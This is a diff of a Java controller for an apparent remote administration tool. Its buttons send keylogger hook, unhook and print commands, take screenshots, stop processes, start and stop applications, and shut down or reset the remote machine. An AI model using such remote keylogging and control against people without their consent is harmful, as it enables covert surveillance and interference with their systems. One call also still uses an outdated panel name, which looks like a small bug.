@@ -25,36 +25,131 @@ public class Controller
     public void initController()
     {
         login.getConnectButton().addActionListener(e -> connectServer());
+        // Keylogger
         home.getLogPanel().getHookButton().addActionListener(e -> handleKeyLogger("Hook"));
         home.getLogPanel().getUnHookButton().addActionListener(e -> handleKeyLogger("Unhook"));
         home.getLogPanel().getPrintButton().addActionListener(e -> handleKeyLogger("Print"));
+
+        // ScreenShot
         home.getScreenPanel().getTakeButton().addActionListener(e -> handleScreenShot("ScreenShot", 1));
         home.getScreenButton().addActionListener(e -> handleScreenShot("ScreenShot", 2));
 
-        home.getProcessPanel().getStartButton().addActionListener(e -> handleProcess("StartProcess"));
+        // Process
         home.getProcessPanel().getStopButton().addActionListener(e -> handleProcess("StopProcess"));
         home.getProcessPanel().getListButton().addActionListener(e -> handleProcess("ListProcess"));
 
-        home.getAppInstallPanel().getListButton().addActionListener(e -> handleApp("ListAppInstalled"));
-        home.getAppRunningPanel().getListButton().addActionListener(e -> handleApp("ListAppRunning"));
+        // App Installer
+        home.getAppInstalledPanel().getListButton().addActionListener(e -> handleAppInstalled("ListAppInstalled"));
+        home.getAppInstalledPanel().getStartButton().addActionListener(e -> handleAppInstalled("StartAppInstalled"));
 
+        // App Running
+        home.getAppRunningPanel().getListButton().addActionListener(e -> handleAppRunning("ListAppRunning"));
+        home.getAppRunningPanel().getStopButton().addActionListener(e -> handleAppRunning("StopAppRunning"));
+
+        //  Shutdown
+        home.getShutdownButton().addActionListener(e -> handleShutdown("Shutdown"));
+        home.getResetButton().addActionListener(e -> handleShutdown("Reset"));
     }
 
-    private void handleApp(String command)
+    private void handleShutdown(String command)
+    {
+        client.sendCommand(command);
+        switch (command)
+        {
+            case ("Shutdown"):
+            {
+                home.notify("System", "      Shutdown Successfully!      ");
+                break;
+            }
+            case ("Reset"):
+            {
+                home.notify("System", "      Reset Successfully!      ");
+                break;
+            }
+        }
+    }
+
+    private void handleAppRunning(String command)
     {
         client.sendCommand(command);
         switch (command)
         {
             case ("ListAppRunning"):
             {
-                client.getApplication().listAppRunning();
+                ArrayList<ArrayList<String>> infoAppRunning = client.getApplication().listAppRunning();
+                home.getAppRunningPanel().updateAppRunningTable(infoAppRunning);
                 break;
             }
+            case ("StopAppRunning"):
+            {
+                if (home.getAppRunningPanel().getClickedAppRunning())
+                {
+                    String IDAppRunning = home.getAppRunningPanel().getClickedAppRunningID();
+                    String NameAppRunning = home.getAppRunningPanel().getClickedAppRunningName();
+                    String notifyStopStatus = client.getApplication().stopAppRunning(IDAppRunning);
 
+                    switch (notifyStopStatus)
+                    {
+                        case "1":
+                        {
+                            home.notify("Application", "      " + NameAppRunning + " (" + IDAppRunning + ") has been stopped      ");
+                            break;
+                        }
+                        case "0":
+                        {
+                            home.notify("Application", "      There is no " + NameAppRunning + " (" + IDAppRunning + ") is running      ");
+                            break;
+                        }
+                    }
+                    handleAppRunning("ListAppRunning");
+                }
+                else
+                {
+                    home.notify("Application", "      You haven't chosen application!      ");
+                }
+                break;
+            }
+        }
+    }
+
+    private void handleAppInstalled(String command)
+    {
+        client.sendCommand(command);
+        switch (command)
+        {
             case ("ListAppInstalled"):
             {
                 ArrayList<ArrayList<String>> infoAppInstalled = client.getApplication().listAppInstalled();
-                home.getAppInstallPanel().updateAppInstalledPanel(infoAppInstalled);
+                home.getAppInstalledPanel().updateAppInstalledPanel(infoAppInstalled);
+                break;
+            }
+
+            case ("StartAppInstalled"):
+            {
+                if (home.getAppInstalledPanel().getStartClicked())
+                {
+                    String appDirectory = home.getAppInstalledPanel().getClickedAppDirectory();
+                    if (appDirectory == null)
+                    {
+                        return;
+                    }
+                    String status = client.getApplication().startApp(appDirectory).trim();
+                    System.out.println(status);
+
+                    if (status.equals("1"))
+                    {
+                        home.notify("Application", "      Start " + home.getAppInstallPanel().getClickedAppName() + " Successfully!      ");
+                    }
+                    else
+                    {
+                        home.notify("Application", "      Error      ");
+                    }
+                }
+                else
+                {
+                    home.notify("Application", "      You haven't chosen application!      ");
+                }
+
                 break;
             }
         }
